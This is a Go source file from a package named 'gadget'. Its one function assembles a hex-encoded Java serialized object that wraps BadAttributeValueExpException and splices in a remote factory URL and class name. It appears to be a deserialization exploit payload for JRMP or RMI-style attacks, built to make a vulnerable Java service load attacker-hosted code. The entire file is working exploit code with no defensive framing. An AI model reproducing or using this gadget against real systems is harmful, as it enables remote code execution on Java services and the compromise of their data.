package gadget

import "encoding/hex"

func GetExceptionWrappedRemoteFactoryBytePayload(factoryURL string, classname string) []byte {
	part1 := "aced0005770f028543deb20000017ee46a02f78003737200" +
		"2e6a617661782e6d616e6167656d656e742e426164417474" +
		"72696275746556616c7565457870457863657074696f6ed4" +
		"e7daab632d46400200014c000376616c7400124c6a617661" +
		"2f6c616e672f4f626a6563743b"
	codebaseStr := GenerateTCSTRING(factoryURL)

	part2 := "787200136a61" +
		"76612e6c616e672e457863657074696f6ed0fd1f3e1a3b1c" +
		"c402000071007e0002787200136a6176612e6c616e672e54" +
		"68726f7761626c65d5c635273977b8cb0300044c00056361" +
		"7573657400154c6a6176612f6c616e672f5468726f776162" +
		"6c653b4c000d64657461696c4d6573736167657400124c6a" +
		"6176612f6c616e672f537472696e673b5b000a737461636b" +
		"547261636574001e5b4c6a6176612f6c616e672f53746163" +
		"6b5472616365456c656d656e743b4c001473757070726573" +
		"736564457863657074696f6e737400104c6a6176612f7574" +
		"696c2f4c6973743b71007e0002787071007e000970757200" +
		"1e5b4c6a6176612e6c616e672e537461636b547261636545" +
		"6c656d656e743b02462a3c3cfd223902000071007e000278" +
		"70000000047372001b6a6176612e6c616e672e537461636b" +
		"5472616365456c656d656e746109c59a2636dd8502000449" +
		"000a6c696e654e756d6265724c000e6465636c6172696e67" +
		"436c61737371007e00064c000866696c654e616d6571007e" +
		"00064c000a6d6574686f644e616d6571007e000671007e00" +
		"027870000000e974002378797a2e6162632e6a696d2e6e65" +
		"74776f726b696e672e4a524d504c697374656e6572740011" +
		"4a524d504c697374656e65722e6a617661740006646f4361" +
		"6c6c7371007e000c000000ae71007e000e71007e000f7400" +
		"09646f4d6573736167657371007e000c0000007971007e00" +
		"0e71007e000f74000372756e7371007e000c000000117400" +
		"2778797a2e6162632e6a696d2e61747461636b2e41747461" +
		"636b42794a524d504c697374656e65727400194174746163" +
		"6b42794a524d504c697374656e65722e6a6176617400046d" +
		"61696e737200266a6176612e7574696c2e436f6c6c656374" +
		"696f6e7324556e6d6f6469666961626c654c697374fc0f25" +
		"31b5ec8e100200014c00046c69737471007e000871007e00" +
		"027872002c6a6176612e7574696c2e436f6c6c656374696f" +
		"6e7324556e6d6f6469666961626c65436f6c6c656374696f" +
		"6e19420080cb5ef71e0200014c0001637400164c6a617661" +
		"2f7574696c2f436f6c6c656374696f6e3b71007e00027870" +
		"737200136a6176612e7574696c2e41727261794c69737478" +
		"81d21d99c7619d03000149000473697a6571007e00027870" +
		"000000007704000000007871007e001e787372"

	classnameStr := GenerateTCSTRING(classname)[2:]
	part3 := "11ff5ec37eb8b6d502000071007e00027870"

	ser, _ := hex.DecodeString(part1 + codebaseStr + part2 + classnameStr + part3)
	return ser
}